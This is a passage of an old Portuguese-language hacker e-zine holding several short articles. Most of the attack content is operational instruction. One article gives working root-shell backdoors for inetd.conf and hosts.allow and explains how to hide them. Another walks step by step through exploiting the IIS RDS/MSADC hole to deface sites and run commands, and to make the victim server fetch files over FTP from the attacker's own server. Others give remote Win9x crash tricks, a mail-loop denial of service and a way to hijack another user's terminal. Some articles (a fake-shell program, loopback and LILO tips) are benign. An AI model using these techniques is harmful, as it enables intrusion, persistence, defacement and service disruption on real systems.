     _xXXXXP~  10 - device\device bug   ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_         MaskMaster        _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



--[ MaskMaster ]--------------------------------------------------------------
device\device bug
------------------------------------------------------------------------------
Ultimamente o device\device bug  vem causando problemas para diversos
usuarios de Win9x que, submitamente, veem seus computadores travarem do nada,
no velho estilo winnuke.

Apesar de ser um bug explorado a um bom tempo no underground, apenas
"recentemente" (6 de Marco, 2k) a galera da Securax Security resolveu
publica-lo.

O bug consiste em uma falha do windows ao tentar abrir arquivos com device
names, como por exemplo CON, NUL, CLOCK$, etc

Esse bug pode ser explorado localmente e remotamente.

--[O bug na pratica]----------------------------------------------------------

As tecnicas abaixo foram amplamente discutidas na BugTraq. Vamos a elas:

- Va no prompt do dos e digite cd con/con

- Em um HTML, use a tag <IMG SRC="file://c:/con/con">
  (Nao tentei ainda window.open("file://c:/con/con"). alguem sabe se funfa?)

- em servidores remotos de ftp que rodem win (grande maioria da galera
  da dalnet nos canais de foto porno ;), voce pode simplesmente usar o
  comando ls con/con

- pessoas com o compartilhamento PRINTER$ tambem pode estar vulneraveis:
  c:\ net user f: \\IP_Remoto\\PRINTER$
  f:
  cd con/con

- links para file://c:/con/con

- Talvez um http://www.servidor.com/..../con/con trave um servidor rodando
  o FrontPage WebServer. Nao tive oportunidade de testar esse.

--[Consequencias no IRC]-----------------------------------------------------

Agora vem a batata quente ;)

Muitos usuarios de IRC estao sendo vitimas desse bug. Vamos ver como ele
eh explorado nesse caso:

- Voce tem um fserver e deixa ele servindo fotos aos usuarios do canal
  #sexpics, por exemplo. Um usuario mal intencionado simplesmente precisa
  usar o comando GET con/con . Seu script simplesmente vai tentar abrir
  esse arquivo e seu computador ira travar. (Alguns scripts sao imunes a isso)

- Voce possui um daqueles scripts que tocam musiquinha, envia musiquinha p/
  os outros, etc? Ah, que legal esse script neh? Pois eh exatamente ele que
  vai te ferrar agora: um usuario mal intencionado pode enviar um comando
  /CTCP #canal SOUND con/con.wav
  e seu script simplesmente ira tentar abrir o con/con ... O resultado voce
  ja sabe.
  Alguns outros podem ser travados caso o atacante digite:
  !seunick con/con.wav
  Isso depende do script.

Vale lembrar que qualquer combinacao de devices funciona (CON\CLOCK$, etc)
------------------------------------------------------------------------------
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~   11 - Codeando kernels   ~YXXXXx_
  _xXXXXXX(           para Henix          )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



   Aha! Como prometido, o henix foi portado para linux e seu code em C foi
aberto para que voce possa fazer as mudancas e melhoras nele. Mas tambem
para facilitar a criacao de novos kernels para ele.
   O henix voce encontra em struck.8m.com, tanto o para dos(pascal) qto
para linux(c).
   Neste texto vou dar as dicas para fazer novos kernels e variantes.










   Topicos
   #######

1. Introducao
2. Editando diretorios
3. Editando Arquivos
4. Editando Usuarios
5. Editando Programas
6. Ultimas Palavras






   Introducao
   ##########

   Para alterar kernels do henix, soh eh preciso editar os headers:

   dir.h - Responsavel pelos diretorios;
   cat.h - Responsavel pelos arquivos;
   kernel.h - Responsavel por comandos e contas;










   Editando Diretorios
   ###################

   Arquivo: dir.h
   Ha 3 coisas a serem editadas para criar novos diretorios:
 
   1. Caminho+Nome do dir;
   2. Conteudo;
   3. Numero total de diretorios.

   Vamos por partes...
   A estrutura q suporta os diretorios do henix eh:

struct henixdir {
  char *name;
  char *count;
};

   A estrutura editada sera' dirs[]. Veja o exemplo:

  {"/etc",
       "/etc\n"
       "-rw-r--r--   1 root     root          638 mar 10 05:38 passwd\n"
       "-rw-r--r--   1 root     root          382 mar 10 05:37 group\n"
  },

   O Caminho+Nome do diretorio eh a char *name "/etc". Sera para onde voce
direcionara o comando "cd" caso queira seguir para esse diretorio.
   O Conteudo eh a char *count. Sera o que sera exibido com o comando ls.
   Depois de compilado fikaria assim:

[struck@henix]$ cd /etc
[struck@henix]$ ls
/etc
-rw-r--r--   1 root     root          638 mar 10 05:38 passwd
-rw-r--r--   1 root     root          382 mar 10 05:37 group
[struck@henix]$

   Barbada neh?
   O numero total de diretorios deve ser mudado em "#define TOTAL_DIRS"
toda a vez que um diretorio for adicionado.

   Nota1: C por exemplo vc for criar um diretorio "/var/log", deve ser
criado antes o diretorio "/var". E o conteudo do "/", "/var" e "/var/log"
devem ser alterados para indicar que o diretorio existe. Caso contrario o
diretorio fikaria invisivel.
   No conteudo de "/" deve estar indicado o "/var";
   No conteudo de "/var" o "/var/log";
   E no conteudo de "/var/log" o seu proprio conteudo.

   Nota2: Na versao atual do henix (qdo este texto foi escrito) ele nao
suporta "cd .." entao nao eh necessario que "." e ".." sejam adicionados
no conteudo dos diretorios.

   Nota3: Caso algum diretorio tenha permissao rwx------. A msg de erro
deve ser colocada no conteudo deste diretorio: "ls: Permission denied\n".









   Editando Arquivos
   #################

   Arquivo: cat.h
   A edicao de arquivos eh semelhante a de diretorios.
   A estrutura de arquivos do henix eh:

struct henixfile {
  char *name;
  char *count;
};

   Veja o exemplo de um arquivo:

  {"/tmp/henix",
       "sh: henix: Is a binary\n"
  },

   O nome do arquivo fika no char *name. Eh o que sera usado pelo comando
"cat" para verificar c um arquivo existe ou nao.
  O conteudo fika em char *count. Eh o que sera exibido pelo comando "cat"
caso o arquivo exista. Note que msgs de erro podem ser colocadas no
conteudo. Neste exemplo mostrei uma saida para qdo alguem quizer ler um
programa.
   Por fim, altere o numero em "#define TOTAL_FILES" de acordo com o
numero total de arquivos.

   Nota: O arquivo criado deve ser adicionado no conteudo do seu diretorio
para que ele nao fique invisivel.









   Editando Usuarios
   #################

   Arquivo: kernel.h
   O henix atual possui um limite para 3 usuarios. Entao voce nao podera
adicionar mais aos atuais, somente altera-los. Futuramente isso sera
corrigido.
   A estrutura de usuarios eh:

struct users {
    int n;
    char *name;
    char *pass;
    int id;
    char *home;
};

   Veja o exemplo de uma conta padrao do henix:

    {1,"struck","cheat",1337,"/home/struck"},

   1 - Numero q vai de 0 a 2 para mostrar a posicao da usuario;
   "struck" - Nome do usuario;
   "cheat" - Senha;
   1337 - UID;
   "/home/struck" - Diretorio home.

   Barbada!!!










   Editando Programas
   ##################

   Arquivo: kernel.h
   Existe uma funcao especial criada para programas que podem variar de
kernel para kernel. A seguinte funcao:

int other_cmd(char cmd[CMD_LEN], char pwd[CMD_LEN]);

   Para editar comandos, voce deve saber um minimo de programacao em C.
   cmd eh a string onde o comando entrado e' gravado.
   pwd eh o diretorio onde o comando foi executado.

   Veja um exemplo de programa:

  if(!strcmp(cmd,"./test") && !strcmp(pwd,"/tmp")) {
       printf("TESTE!TESTE!TESTE!\n");
  }

   Pow! Nao vo fika dando aulas de C. Entao de uma estudada c vc nao
entendeu o code acima.
   O pwd deve ser usado caso seja um programa fora dos diretorios "/bin" e
"/sbin". Caso ele esteja nestes diretorios, a verificacao do diretorio nao
precisa ser feita.

   Nota: Nao c esqueca de alterar o conteudo dos diretorios para exibir
que o programa existe.









   Ultimas Palavras
   ################

   Ok. Esse texto foi feito apenas para introduzir a programacao de
kernels nas 1as versoes do henix for linux. Mas nao me responsabilizo caso
voce venha a utilizar um kernel codeado por segundos e este esteja levando
um trojan ou backdoor.
   Caso voce tenha feito melhoras no source do henix, ou kernels bons,
envie-os para <cszine@xoommail.com> que talvez as alteracoes sejam feitas
e os kernels publicados na page oficial do henix.
   Issu ae!
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~    12 - Inetd Backdoors   ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



   Backdoors no inetd sao uteis por poderem ser acessadas remotamentes
caso o telnetd seja cortado no servidor.
   A inetd backdoor mais conhecida eh akela colocada no /etc/inetd.conf.
Vai um exemplo:

ftp     stream  tcp     nowait  root    /bin/sh	sh -i

   Nao esqueca de resetar o inetd...

[root@localhost /etc]# killall -1 inetd
[root@localhost /etc]# telnet 127.0.0.1 21
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
bash# exit
Connection closed by foreign host.
[root@localhost /etc]#

   Voce pode camufla-la melhor c copiar o /bin/sh para /usr/sbin/in.ftpd
ou no lugar do daemon que voce substituir. Sohc liga pra nao coloca-la em
cima de um daemon que ja esteja rodando ou o admin vai cata a back logo.
   O segundo tipo de inetd backdoor pode ser colocado dentro dos arquivos
de thrusted hosts /etc/hosts.allow e /etc/hosts.deny. Vai o exemplo de
como coloca-las:

in.ftpd : 200.25. : twist /bin/sh -i;

   A manha aki eh que todos os que acessarem o ftpd e que tiverem o ip
comecando por 200.25. vao ter acesso a root shell. Esse tipo de backdoor
owna o outro pq aki voce decide quais os ips q terao acesso a backdoor e
pode roda-lo em cima de um daemon q ja esteja sendo usado.


[root@localhost /etc]# telnet 127.0.0.1 21
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
bash# {.automount,b{in,oot},core,dev,etc,home,l{ib,ost+found},m{isc,nt},opt,proc
,root,sbin,tmp,usr,var} {.automount,b{in,oot},core,dev,etc,home,l{ib,ost+found},
m{isc,nt},opt,proc,

sh: .automount: command not found
bash#
bash# id
id
uid=0(root) gid=0(root) groups=0(root)
bash#
bash# exit
eConnection closed by foreign host.
[root@localhost /etc]#



   C bem que eu soh costumo usar esse tipo de backdoor caso o compilador
der pau pra compilar um binder. Mas eu considero o melhor tipo de backdoor
sem precisar programa.
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~       13 - Email Bug      ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_           Cacaio          _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



Nao vou escrever nada muito grande, mas so' algo no qual ninguem falou ainda.
Vou falar sobre loops infinitos de servidores de email.

O que eu mostrarei aqui pode causar consumo de banda e/ou travamento do
servidor de email.

Isso nao e' do sendmail, do cocomail, msmail, abacatemail ou pirulitomail.
Pode funcionar em qualquer servidor de email. Ou nao.

Quando um email e' enviado para um usuario desconhecido, o MAILER-DAEMON
cria um reply para o email do autor pra dizer que o endereco que ele tentou
enviar a mensagem nao existe. Se algum usuario quiser brincar com os
headers, pode forcar os servidores de email a consumir muita banda respondendo
os mails ou ate' travar.



Exemplificando:

eu mando uma mensagem falsa vindo de jaca@osfaya.com pra jaca@osfaya.com,
sendo que o usuario 'jaca' nao existe. Logo, o servidor de osfaya.com vai
mandar um reply pra jaca@osfaya.com, e assim por diante (se estiver bem
configurado nao ;).

Se o servidor estiver mal configurado e isso for possivel, apenas por voce
mandar umas simples 20 ou 30 mensagens o servidor pode entrar em um loop
em uma velocidade relativamente grande, comendo banda e processador, e talvez
ate' travando o servidor.

A solucao? Usar um servidor o qual voce possa configurar tudo. E saber
configurar.

[]'s

     Cacaio               cacaio@deathknights.com
     `'`'`'               `'`'`'`'`'`'`'`'`'`'`'`'
                          http://cacaio.deathknights.org
                          `'`'`'`'`'`'`'`'`'`'`'`'`''`'`
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~    14 - Brincando com o   ~YXXXXx_
  _xXXXXXX(           LOOPBACK            )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~


   O que vou mostrar neste texto como mudar as configuracoes padroes de
loopback usadas pelo linux e outros unixes.
   Mudar o hostname (localhost) eh a coisa mais basica que tem, e todos
devem ta ligado de como faz. Mas soh pra lembrar...

[root@localhost rc.d]# hostname elito.br
[root@localhost rc.d]# bash
[root@elito rc.d]#


   Isso voce consegue encontrar nos livros "Introduzindo ao linux" (Nao
sei c existe, foi soh um exemplo. Introduzir rlz!). Entao vo mostar algo
mais legalzinhu de fazer...
   O objetivo aki eh mudar o ip (127.0.0.1) para (1.3.3.7). Vejamos o log:


[root@localhost fe]# route
Tabela de Roteamento IP do Kernel
Destino         Roteador        MáscaraGen.    Opções Métrica Ref   Uso Iface
127.0.0.0       *               255.0.0.0       U     0      0        2 lo
[root@localhost fe]# ifconfig
lo        Encapsulamento do Link: Loopback Local  
          end. inet:127.0.0.1  Bcast:127.255.255.255  Masc:255.0.0.0
          UP BROADCAST LOOPBACK RUNNING  MTU:3584  Métrica:1
          Pacotes RX:88 erros:0 descartados:0 sobreposições:0 quadros:0
          Pacotes TX:88 erros:0 descartados:0 sobreposições:0 portadora:0
          colisões:0 



   Issu foi feito em um conectiva... por issu ta traduzido...
   ifconfig configura interfaces de rede.
   route manipula a tabela de roteamento IP.
   O que faremos eh apagar todas as configuracoes atuais e reescreve-las.



[root@localhost fe]# route del -net 127.0.0.0 netmask 255.0.0.0 lo
[root@localhost fe]# route
Tabela de Roteamento IP do Kernel
Destino         Roteador        MáscaraGen.    Opções Métrica Ref   Uso Iface
[root@localhost fe]# ifconfig lo down
[root@localhost fe]# ifconfig



   Ta apagado.
   Agora reconfigurando...



[root@localhost fe]# ifconfig -a lo 1.3.3.7
[root@localhost fe]# ifconfig
lo        Encapsulamento do Link: Loopback Local  
          end. inet:1.3.3.7  Bcast:127.255.255.255  Masc:255.0.0.0
          UP BROADCAST LOOPBACK RUNNING  MTU:3584  Métrica:1
          Pacotes RX:88 erros:0 descartados:0 sobreposições:0 quadros:0
          Pacotes TX:88 erros:0 descartados:0 sobreposições:0 portadora:0
          colisões:0 

[root@localhost fe]# route add -host 1.3.3.7 lo
[root@localhost fe]# route
Tabela de Roteamento IP do Kernel
Destino         Roteador        MáscaraGen.    Opções Métrica Ref   Uso Iface
1.3.3.7         *               255.255.255.255 UH    0      0        0 lo



   Pronto!
   Vamos ver c funfa???



[root@localhost fe]# ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1): 56 data bytes
ping: sendto: Network is unreachable
ping: wrote 127.0.0.1 64 chars, ret=-1
ping: sendto: Network is unreachable
ping: wrote 127.0.0.1 64 chars, ret=-1
ping: sendto: Network is unreachable
ping: wrote 127.0.0.1 64 chars, ret=-1
ping: sendto: Network is unreachable
ping: wrote 127.0.0.1 64 chars, ret=-1
ping: sendto: Network is unreachable
ping: wrote 127.0.0.1 64 chars, ret=-1

--- 127.0.0.1 ping statistics ---
5 packets transmitted, 0 packets received, 100% packet loss
[root@localhost fe]# ping 1.3.3.7
PING 1.3.3.7 (1.3.3.7): 56 data bytes
64 bytes from 1.3.3.7: icmp_seq=0 ttl=64 time=0.2 ms
64 bytes from 1.3.3.7: icmp_seq=1 ttl=64 time=0.1 ms
64 bytes from 1.3.3.7: icmp_seq=2 ttl=64 time=0.1 ms
64 bytes from 1.3.3.7: icmp_seq=3 ttl=64 time=0.1 ms
64 bytes from 1.3.3.7: icmp_seq=4 ttl=64 time=0.1 ms

--- 1.3.3.7 ping statistics ---
5 packets transmitted, 5 packets received, 0% packet loss
round-trip min/avg/max = 0.1/0.1/0.2 ms



   Rulah!!!
   O 127.0.0.1 agora eh 1.3.3.7!!!
   Soh nao esqueca de mudar no /etc/hosts ou o localhost nao vai funfa.
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~ 15 - Problemas com o LILO ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~


  Atualmente, encontrei certos erros na gravacao do lilo no MBR durante a
instalacao do linux.
  O problema ocorre qdo o numero de cylinders no HD eh muito alto (maior
de 1024) e entao o lilo nao pode ser gravado. O foda eh q issu eh feito
apenas no final da instalacao do linux, entao... voce vai fikar moh tempao
esperando os pakotes do linux todos serem instalados e lah no fim encontra
essa msg de erro.
  Por issu aconselho voce, ateh mesmo c nunca teve este problema, a veri-
ficar no fdisk c este erro pode ocorrer ou nao.
  Como fazer isto???
  Entrando no fdisk digite p.
  Isso ira exibir as particoes do hd atual e tambem o numero de headers,
sectors e cylinders.
  C o numero de cylinders passar de 1024, voce podera ter este problema.
  Entao faca o seguinte...
  Ainda no fdisk digite x para entrar no menu de funcoes extras.
  Lah digite c para mudar o numero de cylinders. Coloque qquer numero
menor q 1024 e salve digitando w.
  C ainda assim o problema persistir (Ja aconteceu em alguns casos...)
tente muda-lo no BIOS Setup.
  Em alguns Setup voce pode encontrar a opcao Large Disk Access Mode. C
este estiver como Other mude-o para DOS, volte no fdisk e verifique o
numero de cylinders. Ele devera estar abaixo de 1024 novamente.
  C mesmo assim continuar dando pau no lilo. O esquema eh criar uma 
particao com uns 15Mb antes do cilindro 1024 soh para o lilo.
  Essas foram as unicas solucoes q encontrei para o problema. C nao
resolverem no seu caso... bem... foda-se! =)
  Ah!!! To digitando issu dias depois de ter feito essa materia... Foi 
lancado um path para esse erro recentemente (6/5/0) e voce pode acha-la 
em: ftp://sd.dynhost.com/pub/linux/lilo/ 
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~     16 - Truques com      ~YXXXXx_
  _xXXXXXX(           Terminais           )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_       Cheat  Struck       _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



   Avacalhe com outros q estiverem usando o mesmo login q vc.
   Veja o exemplo...

[struck@localhost struck]$ who
root     tty1     May  3 02:28
root     tty2     May  3 03:01
root     tty3     May  3 03:57
struck   tty4     May  3 04:20
struck   tty5     May  3 04:21
[struck@localhost struck]$
[struck@localhost struck]$ cat /dev/tty5
ls
ls
ls -la
lllllllllllllllll
exit
[Ctrl+c]
[struck@localhost struck]$ who
root     tty1     May  3 02:28
root     tty2     May  3 03:01
root     tty3     May  3 03:57
struck   tty4     May  3 04:20
[struck@localhost struck]$

   Depois q vc da cat no terminal do kra (q esteja com o mesmo login, ou
vc nao podera dar cat) tudo o q ele digitar vai aparecer na sua tela e
nada na tela dele. Ae ele fikara tentando ateh encher o sako e sair.



   Como abrir um prompt sem passar por login???
   Ter tem como... Mas e' preciso ser r00t para fazer. =)
   Pra que serve issu entao???
   Bah! C voce nao sabe foda-se!!! Mas pense antes de achar q issu nao
serve pra nada... mentalize a cena: voce ta codeando e quer ver o manual
de um certo comando. Entao voce da Alt+F5, digita o login, a senha,
man blablabla... Argh!!!! Pra que tudo issu? Vamu facilitar...
   Basta digitar 'open -sl'.
   Pronto. C ta num outro prompt.
   C vc ja tiver ocupando os 12 terminais, faca o seguinte...

sh# cd /dev
sh# ./MAKEDEV tty13
sh# ./MAKEDEV tty14
sh# ./MAKEDEV tty15
sh# ./MAKEDEV tty16

   E por ae vai...
   Para alterar de um terminal para outro (nos maiores de 12), use o Alt
da direita e nos de 1 a 12 use o Alt esquerdo como antigamente.
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~     17 - RDS Hacking      ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_         MaskMaster        _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



--[ MaskMaster ]-------------------------------------------------------------
RDS Hacking
-----------------------------------------------------------------------------

// Antes de qualquer coisa, vale lembrar que esse texto eh apenas para fins
// educacionais, ou seja, tudo que voce fizer sera responsabilidade sua.
// NAO ESTOU INCENTIVANDO NINGUEM A COMETER CRIMES DIGITAIS.
// Essas falhas e tecnicas ja estao mundialmente conhecidas, mas mesmo assim
// muitos servidores (principalmente do governo brasileiro) ainda estao
// vulneraveis. Espero que apos esse texto os admins REALMENTE percebam os
// enormes riscos deste problema e o elimine.
// Estou levando em conta que voce ira utilizar essas tecnicas apenas
// em suas proprias maquinas ou em maquinas que voce tenha devida autorizacao
// para isso.

Sem apresentacoes, vamos direto ao texto:

Atualmente, podemos perceber uma grande demanda de "raquers" invadindo
paginas do governo e por esse motivo se auto-intitulando "elite".
Entao, mesmo eu nao fazendo parte deste seleto grupo, resolvi mostrar os
grandes segredos de invasao usados por essa "superhypermega elite".
Ate mesmo na pagina do RFP (o que codou o exploit) voce pode ver o texto:
Lammers wanted e um simbolo: RDS. O porque disso tudo? Voce vai entender
ja.

Como identificar uma pagina "raqueada" com MSADC: 99% das vezes essas paginas
estao com fundo branco, apenas com um texto e nenhuma imagem, link, etc
O motivo disso voce ira entender mais abaixo.

MAS ATENCAO! preste muita, mais muita atencao mesmo, porque essa tecnica
e' dificilima, e requer um alto conhecimento tecnico em computacao!
Antes de utiliza-la, recomendo que voce faca como a "elite raquer" e leia
antes os livros: Manual Completo do Raquer (versao 2000!) Panico na
Internerd (1, 2 e 3), e outros textos extremamente tecnicos (huahahahaha)

Obs: Vale lembrar que eu nao estou menosprezando quem usa a tecnica do RDS
(qualquer tecnica que te de acesso a maquina eh valida) e sim esses grupos
que se acham elite por usa-la.

Ok, voce ja leu os livros? Entao VAMOS LA, hora de acao!

Primeiro, voce vai nos sites abaixo ler um pouquinho, pois nao vou ficar aqui
explicando virgula por virgula todos os detalhes do bug. Os textos sao em
ingles, mas tem a traducao de um deles por la. A historia em torno desse bug
eh muito interessante, involvendo umas "alfinetadas" entre o Russ da NTBugtraq
e o RFP.

Mas, se voce prefere fazer como a "elite" e ir direto ao assunto ("Nao preciso
ler essas porcarias"), ok, vai em frente.

http://www.wiretrip.net/rfp/p/doc.asp?id=1
http://www.wiretrip.net/rfp/p/doc.asp?id=3
http://www.wiretrip.net/rfp/p/doc.asp?id=4
http://www.wiretrip.net/rfp/p/doc.asp?id=5
http://www.wiretrip.net/rfp/p/doc.asp?id=29

e dessas hps tem muito mais link p/ vc se virar

Voce vai precisar tambem desse script escrito em perl, mas ATENCAO: nao
divulgue esse script, ou a "elite" vai puxar seu pe a noite.

http://www.wiretrip.net/rfp/bins/scripts/msadc2.pl

Depois voce vai precisar do PERL. Se vc nao tem, www.perl.com e pegue a versao
do seu SO.

Para saber se uma maquina eh vulneravel: vai no browser e digita:
http://www.seuservidor.com/msadc/msadcs.dll
caso o arquivo for encontrado, provavelmente seu servidor eh vulneravel

Encontrou um servudor vulneravel? Ok, entao agora tudo o que voce deve
fazer eh o seguinte: (faca um backup do seu index.htm antes p/ nao perde-lo)

1§ - perl msadc.pl -h www.hostvulneravel.com
ele vai te pedir para digitar um comando. Voce digita:

cmd /c echo Agora tambem sou da elite raquer > caminhoDowwwroot\index.htm

pronto. Parabens, 31337!

"Po, mas como eu consigo o caminhoDowwwroot?"
Vai no seu browser e digita:
www.hostvulneravel.com/qualquermerda.idq
ou
www.hostvulneravel.com/qualquermerda.htx            
www.hostvulneravel.com/qualquermerda.idc

existem outros metodos tb (shtml.exe? hum...), isso fica por sua conta 
um desses provavelmente ira funcionar, e vc recebera uma pagina com o seguinte
erro:
"path not found c:\inetpub\wwwroot\qualquermerda.idq"
pronto

ou seja, fica
cmd /c echo Agora tambem sou da elite > c:\inetpub\wwwroot\index.htm

Lembrando que outros comandos funcionam perfeitamente. Entao:
cmd /c dir c:\ /s > c:\inetpub\wwwroot\dirc.txt

vai criar uma listagem dos arquivos na unidade c: em
www.hostvulneravel.com/dirc.txt

Parabens, agora voce tambem conhece as tecnicas da "elite".

--[BONUS!]-------------------------------------------------------------------
Como colocar uma html no lugar daquela coisa feia de txt!
(ou qualquer outro arquivo)

Ok, voce viu que seu servidor esta vulneravel, e resolveu colocar uma html la.
Soh que de repente voce percebe que vc nao pode fazer coisas do tipo:

cmd /c echo <HTML> etc,etc,etc </HTML> > c:\inetpub\wwwroot\test.htm

Nao meu amigo, voce tem que usar seu cerebro, e arrumar um outro jeito de
colocar o arquivo que voce quer no servidor, neste exemplo, um HTML.
(Sim, isso mesmo. Por isso que 99% dos defacements com RDS soh possuem um
texto e + nada. Na verdade aquilo nada mais eh que um arquivo texto com
extensao htm).

Existem diversas tecnicas usadas pra isso, algumas envolvendo compartilhamento
de arquivos (usado pelo pessoal do r00tabega em um .pl ai p/ automatizar esse
processo), etc. Porem vou descrever aqui uma outra tecnica que funciona
perfeitamente. Ela consiste em usar o ftp.exe do servidor para fazer os
downloads dos arquivos que nos queremos,  e depois usa-los a vontade.
(ultimamente andam saindo uns scripts ai que andam usando essa tecnica,
mas eu vou explicar como fazer na mao mesmo). Vamos la:

Se voce analizar as opcoes do ftp.exe, voce vai ver a seguinte opcao:

-s:filename    Specifies a text file containing FTP commands; the
               commands will automatically run after FTP starts.

Isso mesmo, se vc usar ftp -s:comandos.txt ele vai rodar os comandos no
arquivo comandos.txt.

entao, o que vc tem a fazer eh criar um txt no server com os comandos que
voce quer. Voce tem que ter um FTP Server onde voce tenha permissao de escrita
(sim, pode ser o seu mesmo. Levando em consideracao que voce esta usando isso
em maquinas que voce tenha autorizacao, isso nao tem nenhum problema ;)

Ok, digamos que nosso ftp Server eh ftp.meuservidor.com
no diretorio /incoming do ftp.meuservidor.com nos colocamos nosso arquivo
HTML pronto (index.htm)

agora, usamos o script (duh!)

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c echo open <ip_do_seu_ftp_server> > comandos.txt

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c echo anonymous >> comandos.txt        (algumas vezes vc pode
                                                 ter problemas com os 2
                                                 primeiros, por isso
                                                 os quotes abaixo.)

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c echo qualquermerda@duh >> comandos.txt

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c echo quote user anonymous >> comandos.txt

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c echo quote pass silvio@sol.com.br >> comandos.txt

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c echo cd /incoming >> comandos.txt        (eu gosto de cd antes,
                                                    e dai? :P)
 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c echo get index.htm >> comandos.txt

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c echo bye >> comandos.txt


 e pra finalizar,

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c ftp -s:comandos.txt

   seria melhor ver se tudo ocorreu bem, entao seria melhor usar:

 $ perl msadc.pl -h www.hostvulneravel.com
   cmd /c ftp -s:comandos.txt > c:\inetpub\wwwroot\ftpresults.txt

 e ver no ftpresults.txt se tudo rolou como desejado.

 se tudo ocorreu bem, seu html esta la. pronto amigo, agora coloque ele
 onde voce quiser :)

 (se for passar arquivos binarios, nao esqueca do comando bin antes!)

E dai em diante, voce pode fazer 1000 coisas. Eh soh ter criatividade.

Ok, depois desse texto espero ver algumas htmls legais por ae, e nao aquele
monte de texto feio :P :)

that's all folks

see ya
------------------------------------------------------------------------------
















        _xXXXP^''                   ``^YXXXx_
     _xXXXXP~   18 - WinNT Folder bug   ~YXXXXx_
  _xXXXXXX(                               )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                               )XXXXXXP~
     ~YXXXXb_          Cliptor          _dXXXXP~
        ~YXXXbx..                   ..xdXXXP~



Meu primeiro texto pra f3. Logo no primeiro, jah falarei sobre o rWindows NT 4,
do qual sou anti. Agradeco ao Struck por me dar esse espacinho.
Como adoro escrever e pah.

Sei que 1% de quem pegar o zine, vai ler o texto acima.
Entao pros gay maos na cobra.
pros mano. Maos a obra.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

No texto abaixo vamos falar sobre o Windows NT 4, que tem muito bug, que com
 o tempo eu vou falando sobre os mesmos para os leitores da f3.

BORALAH!

